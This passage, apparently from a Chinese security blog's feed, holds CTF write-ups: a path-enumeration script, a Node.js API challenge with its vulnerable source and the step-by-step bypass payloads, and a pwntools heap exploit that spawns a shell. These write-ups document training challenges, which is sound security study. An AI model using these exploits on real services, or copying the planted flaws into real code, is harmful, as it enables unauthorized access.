class="string">&#x27;Nb&#x27;</span>, <span class="string">&#x27;Mo&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>, <span class="string">&#x27;Ru&#x27;</span>, <span class="string">&#x27;Rh&#x27;</span>, <span class="string">&#x27;Pd&#x27;</span>, <span class="string">&#x27;Ag&#x27;</span>, <span class="string">&#x27;Cd&#x27;</span>, <span class="string">&#x27;In&#x27;</span>, <span class="string">&#x27;Sn&#x27;</span>, <span class="string">&#x27;Sb&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Xe&#x27;</span>, <span class="string">&#x27;Cs&#x27;</span>, <span class="string">&#x27;Ba&#x27;</span>, <span class="string">&#x27;La&#x27;</span>, <span class="string">&#x27;Ce&#x27;</span>, <span class="string">&#x27;Pr&#x27;</span>, <span class="string">&#x27;Nd&#x27;</span>, <span class="string">&#x27;Pm&#x27;</span>, <span class="string">&#x27;Sm&#x27;</span>, <span class="string">&#x27;Eu&#x27;</span>, <span class="string">&#x27;Gd&#x27;</span>, <span class="string">&#x27;Tb&#x27;</span>, <span class="string">&#x27;Dy&#x27;</span>, <span class="string">&#x27;Ho&#x27;</span>, <span class="string">&#x27;Er&#x27;</span>, <span class="string">&#x27;Tm&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Yb&#x27;</span>, <span class="string">&#x27;Lu&#x27;</span>, <span class="string">&#x27;Hf&#x27;</span>, <span class="string">&#x27;Ta&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;Re&#x27;</span>, <span class="string">&#x27;Os&#x27;</span>, <span class="string">&#x27;Ir&#x27;</span>, <span class="string">&#x27;Pt&#x27;</span>, <span class="string">&#x27;Au&#x27;</span>, <span class="string">&#x27;Hg&#x27;</span>, <span class="string">&#x27;Tl&#x27;</span>, <span class="string">&#x27;Pb&#x27;</span>, <span class="string">&#x27;Bi&#x27;</span>, <span class="string">&#x27;Po&#x27;</span>, <span class="string">&#x27;At&#x27;</span>, <span class="string">&#x27;Rn&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Fr&#x27;</span>, <span class="string">&#x27;Ra&#x27;</span>, <span class="string">&#x27;Ac&#x27;</span>, <span class="string">&#x27;Th&#x27;</span>, <span class="string">&#x27;Pa&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;Np&#x27;</span>, <span class="string">&#x27;Pu&#x27;</span>, <span class="string">&#x27;Am&#x27;</span>, <span class="string">&#x27;Cm&#x27;</span>, <span class="string">&#x27;Bk&#x27;</span>, <span class="string">&#x27;Cf&#x27;</span>, <span class="string">&#x27;Es&#x27;</span>, <span class="string">&#x27;Fm&#x27;</span>, <span class="string">&#x27;Md&#x27;</span>, <span class="string">&#x27;No&#x27;</span>, <span class="string">&#x27;Lr&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Rf&#x27;</span>, <span class="string">&#x27;Db&#x27;</span>, <span class="string">&#x27;Sg&#x27;</span>, <span class="string">&#x27;Bh&#x27;</span>, <span class="string">&#x27;Hs&#x27;</span>, <span class="string">&#x27;Mt&#x27;</span>, <span class="string">&#x27;Ds&#x27;</span>, <span class="string">&#x27;Rg&#x27;</span>, <span class="string">&#x27;Cn&#x27;</span>, <span class="string">&#x27;Nh&#x27;</span>, <span class="string">&#x27;Fl&#x27;</span>, <span class="string">&#x27;Mc&#x27;</span>, <span class="string">&#x27;Lv&#x27;</span>, <span class="string">&#x27;Ts&#x27;</span>, <span class="string">&#x27;Og&#x27;</span>, <span class="string">&#x27;Uue&#x27;</span>)</span><br><span class="line">url = <span class="string">&quot;http://5fd398b5-f94f-4f8a-b379-797755b20891.node3.buuoj.cn/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> periodic_table:</span><br><span class="line">    req = requests.get(url + element + <span class="string">&quot;.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> req.status_code != requests.codes.ok:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    result += req.text</span><br><span class="line">print(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>跑出来的字符串拼接成一个文件名，打开即是flag。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020电信天翼杯CTF初赛-APITest</title>
    <url>/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest/</url>
    <content><![CDATA[<h1 id="2020电信天翼杯CTF-APITest">2020电信天翼杯CTF APITest</h1>
<blockquote>
<p>先吐槽一下，赛后竟然没有WP？？？？？</p>
</blockquote>
<p>完全不会nodejs，做了一下午居然做出来了。。。题目打开，访问<code>source</code>API接口，显示源码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&quot;cors&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> uuidv4 = <span class="built_in">require</span>(<span class="string">&quot;uuid/v4&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">&quot;md5&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;express-jwt&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jsonwebtoken = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>).createServer(app);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; flag, secret, jwtSecret &#125; = <span class="built_in">require</span>(<span class="string">&quot;./flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  port: process.env.PORT || <span class="number">8081</span>,</span><br><span class="line">  adminValue: <span class="number">1000</span>,</span><br><span class="line">  message: <span class="string">&quot;Can you get flag?&quot;</span>,</span><br><span class="line">  secret: secret,</span><br><span class="line">  adminUsername: <span class="string">&quot;kirakira_dokidoki&quot;</span>,</span><br><span class="line">  whitelist: [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;/login&quot;</span>, <span class="string">&quot;/init&quot;</span>, <span class="string">&quot;/source&quot;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> users = &#123;</span><br><span class="line">  <span class="number">0</span>: &#123;</span><br><span class="line">    username: config.adminUsername,</span><br><span class="line">    isAdmin: <span class="literal">true</span>,</span><br><span class="line">    rights: <span class="built_in">Object</span>.keys(config)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line">app.use(</span><br><span class="line">  jwt(&#123; <span class="attr">secret</span>: jwtSecret &#125;).unless(&#123;</span><br><span class="line">    path: config.whitelist</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">error, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error.name === <span class="string">&quot;UnauthorizedError&quot;</span>) &#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;Invalid token or not logged in.&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> jsonwebtoken.sign(o, jwtSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params">data = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">&quot;ok&quot;</span>, <span class="attr">data</span>: data &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">err</span>(<span class="params">msg = <span class="string">&quot;Something went wrong.&quot;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>, <span class="attr">message</span>: msg &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">6</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toLowerCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (u.username.toUpperCase() === config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() === config.adminUsername.toLowerCase()) || u.isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">&quot;secret&quot;</span>, <span class="string">&quot;port&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(blacklist.includes(arr)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">hint</span>:  <span class="string">&quot;You can get source code from /source&quot;</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/source&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;app.js&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: <span class="built_in">Math</span>.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="literal">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="string">&quot;adminUsername&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (isValidUser(u)) &#123;</span><br><span class="line">    users[u.id] = u;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: u.id &#125;) &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;Invalid creds&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/init&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; secret &#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> target = md5(config.secret.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> adminId = md5(secret)</span><br><span class="line">    .split(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get server info</span></span><br><span class="line">app.get(<span class="string">&quot;/serverInfo&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/becomeAdmin&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123;value&#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> maxValue = [value, config.adminValue].sort()[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(value &gt;= maxValue &amp;&amp; user.value &gt;= value) &#123;</span><br><span class="line">    user.isAdmin = <span class="literal">true</span>;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;You need pay more!&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only admin can update user</span></span><br><span class="line">app.post(<span class="string">&quot;/updateUser&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="keyword">if</span> (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;You&#x27;re not an admin!&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(<span class="function">(<span class="params">value, index, self</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> self.indexOf(value) === index;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">user</span>: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only uid===0 can get the flag</span></span><br><span class="line">app.get(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">&quot;Unauthorized&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(config.port, <span class="function">() =&gt;</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;config.port&#125;</span>!`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="基本思路">基本思路</h2>
<ul>
<li>利用javascript大小写特性使用管理员的用户名登录</li>
<li>使用弱类型比较绕过<code>isAdmin</code>判断</li>
<li>给用户添加查看secret的权限并查看secret的值</li>
<li>通过赋值secret将adminId设置为0</li>
<li>获取Flag</li>
</ul>
<h2 id="第一步">第一步</h2>
<p><code>login</code>API用<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">javascript大小写特性绕过</a>，payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;Kırakira_dokidoki&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>回显token的值</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVkMWNlYmU1LTFiZWItNDA4Yi05YzE2LTViOGQ0NmM4ODIzMCIsImlhdCI6MTU5NjE4MTUyOH0.uyZInKJWeJ7mr290HKV5Z41Pf6_aCjPvvDEKkvanbtk&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第二步">第二步</h2>
<p><code>becomeAdmin</code>API使用字符串绕过</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;value&quot;</span>: <span class="string">&quot;11&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第三步">第三步</h2>
<p>使用数组绕过<code>updateUser</code>API</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;rights&quot;</span>:[[<span class="string">&quot;secret&quot;</span>]]&#125;</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;user&quot;</span>:&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;Kırakira_dokidoki&quot;</span>,<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;ed1cebe5-1beb-408b-9c16-5b8d46c88230&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="number">100</span>,<span class="attr">&quot;isAdmin&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;rights&quot;</span>:[<span class="string">&quot;message&quot;</span>,<span class="string">&quot;adminUsername&quot;</span>,[<span class="string">&quot;secret&quot;</span>]]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四步">第四步</h2>
<p>直接访问<code>serverInfo</code>获取<code>secret</code>的值，回显</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;info&quot;</span>:[&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;message&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;Can you get flag?&quot;</span>&#125;,&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;adminUsername&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;kirakira_dokidoki&quot;</span>&#125;,&#123;<span class="attr">&quot;name&quot;</span>:[<span class="string">&quot;secret&quot;</span>],<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;1145141919810&quot;</span>&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第五步">第五步</h2>
<p>访问<code>init</code>API，payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;secret&quot;</span>:<span class="string">&quot;1145141919810&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTk2MTg3MDk4fQ.Fdfrcfvnxjdh54WcTbu79nqKFv1dcucBCAoTJenw52I&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第六步">第六步</h2>
<p>把刚刚获得到的id=0的token替换之前的token得到flag。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/HWHF%7B2J0HY0Q4%60ZX9$F3%25RQ.png" alt=""></p>
<p>参考：<a href="https://xz.aliyun.com/t/7177">https://xz.aliyun.com/t/7177</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>星盟6月AWD复盘——web+pwn</title>
    <url>/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn/</url>
    <content><![CDATA[<h1 id="星盟6月AWD复盘——web-pwn">星盟6月AWD复盘——web+pwn</h1>
<blockquote>
<p>PWN由队内gamous师傅和remila师傅撰写</p>
</blockquote>
<h2 id="PWN">PWN</h2>
<h3 id="PWN1">PWN1</h3>
<p>ida没法反编译，造成了很大的困扰，可以看到有选项1有一个明显的栈溢出，而且直接输出的话也有残留指针，但只有一次机会，提高了利用难度，修复的话直接把read的值改了<br>
game是patch两次game的elf之后设置权限执行，直接把patch的赋值nop掉了<br>
然后是一个notepad，堆上常见的玩法</p>
<p>没能及时写出exp且花了太多时间在这题上<br>
在notepad上delte_mark有一个uaf,脚本上show_mark的函数一直写错成delte_mark没注意到，错过了一堆flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your option:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">elf  = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content1, content2</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;new&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note size:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note name:&#x27;</span>)</span><br><span class="line">    sh.sendline(content1)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note content:&#x27;</span>)</span><br><span class="line">    sh.sendline(content2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content1, content2</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note name:&#x27;</span>)</span><br><span class="line">    sh.sendline(content1)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note content:&#x27;</span>)</span><br><span class="line">    sh.sendline(content2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;delete&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; index of note you want to mark:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark info:&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_mark</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;edit_mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark content:&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_mark</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;show_mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_mark</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;delete_mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">new(<span class="number">0x100</span>, <span class="string">&#x27;aaaaaaa&#x27;</span>, <span class="string">&#x27;aaaaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">mark(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete_mark(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;aaaaaa&#x27;</span>, p32(<span class="number">0</span>) * <span class="number">2</span> + p32(<span class="number">0x0804BFC4</span>) + p32(<span class="number">0x08048810</span>))<span class="comment">#1</span></span><br><span class="line">show_mark(<span class="number">0</span>)</span><br><span class="line">libc_base = u32(sh.recvn(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, p32(<span class="number">0</span>) * <span class="number">2</span> + p32(bin_sh_addr) + p32(system))</span><br><span class="line">show_mark(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="PWN2">PWN2</h3>
<p>pwn2从难度上比pwn1简单不少，可惜在pwn1上看的太久，没注意pwn2放题，错过了好多白花花的flag</p>
<h4 id="第一个洞-backdoor">第一个洞 backdoor</h4>
<h5 id="利用">利用</h5>
<p>输入+1等于0即可执行system<br>
